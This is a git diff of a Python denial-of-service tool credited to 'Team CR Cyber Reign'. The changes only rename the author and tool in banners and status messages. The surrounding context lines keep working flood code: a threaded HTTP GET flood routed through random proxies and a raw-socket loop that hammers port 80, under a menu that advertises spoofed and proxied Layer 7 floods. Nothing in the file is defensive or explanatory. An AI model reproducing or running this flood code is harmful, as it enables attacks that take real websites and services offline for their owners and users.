@@ -27,19 +27,21 @@ def show_intro():
     print("""_______________________________________________
 Wellcome to Our Tools🔥
 \033[1;32mThis Tools Developer By Team CR Cyber Reign
- █████╗ ██████╗ ██████╗  █████╗ ██████╗ 
-██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
-███████║██████╔╝██████╔╝███████║██████╔╝
-██╔══██║██╔══██╗██╔══██╗██╔══██║██╔══██╗
-██║  ██║██████╔╝██║  ██║██║  ██║██║  ██║
-╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
-  ================================================
-\033[1;33mDEVELOPER ▶ ABRAR YEAGER
+*             (       *     
+ (  `     (      )\ )  (  `    
+ )\))(    )\    (()/(  )\))(   
+((_)()\((((_)(   /(_))((_)()\  
+(_()((_))\ _ )\ (_))  (_()((_) 
+|  \/  |(_)_\(_)|_ _| |  \/  | 
+| |\/| | / _ \   | |  | |\/| | 
+|_|  |_|/_/ \_\ |___| |_|  |_|
+=================================
+\033[1;33mDEVELOPER ▶ MAIM YEAGER
 TEAM ▶︎CR CYBER Reign
 CEO   ▶︎ALIF REHMAN.
-MY SON:-MAIM YEAGER
+MY SON:-ABRAR YEAGER
 CHANNEL  ▶︎CYBER REIGN
-TOOLS NAME ▶︎5X ABRAR DDOS TOOLS
+TOOLS NAME ▶︎5X MAIM DDOS TOOLS
 ================================================""")
     print("\033[0m")
     time.sleep(2)
@@ -51,7 +53,7 @@ def show_banner():
     print("""\033[95m
 ╔═════════════════════════════════════════════════════════╗
   ☠️TEAM CR CYBER REIGN ☠️               
- 🔥 Coded by: ABRAR YEAGER| Proxy + Multi-Vector Engine 🔥    ║
+ 🔥 Coded by: MAIM YEAGER| Proxy + Multi-Vector Engine 🔥    ║
 ╠═════════════════════════════════════════════════\033[0m
 """.format(NUM_THREADS))
     time.sleep(1)
@@ -104,7 +106,7 @@ def goldeneye_flood(url, proxies=None):
                 headers = generate_headers(urlparse(url).netloc)
                 proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
                 requests.get(url, headers=headers, proxies=proxy, timeout=3)
-                print(f"\033[94m[🌀] GoldenEye packet sent to {url}\033[0m")
+                print(f"\033[94m[🦅] maim hax packet sent to {url}\033[0m")
             except:
                 pass
     for _ in range(NUM_THREADS):
@@ -120,7 +122,7 @@ def socket_flood(domain, ip):
                 s.connect((ip, 80))
                 s.send(f"GET / HTTP/1.1\r\nHost: {domain}\r\n\r\n".encode())
                 s.close()
-                print(f"\033[91m[🔌] Raw TCP packet sent to {ip}\033[0m")
+                print(f"\033[91m[🗿] Maim Raw TCP packet sent to {ip}\033[0m")
             except:
                 pass
     for _ in range(NUM_THREADS):
@@ -149,7 +151,7 @@ def start_ui():
 
     print("\033[96m")
     print("╔════════════════════════════════════════════╗")
-    print("║        🔥 CR POWERFUL DDOS TOOLS MENU 🔥      ║")
+    print("║        🔥 CR MAIM POWERFUL DDOS TOOLS MENU 🔥      ║")
     print("╠════════════════════════════════════════════╣")
     print("║ [1] Ultra HTTP Burst (Spoof + Proxy)      ║")
     print("║ [2] Global Layer 7 (Proxy Flood)       ║")
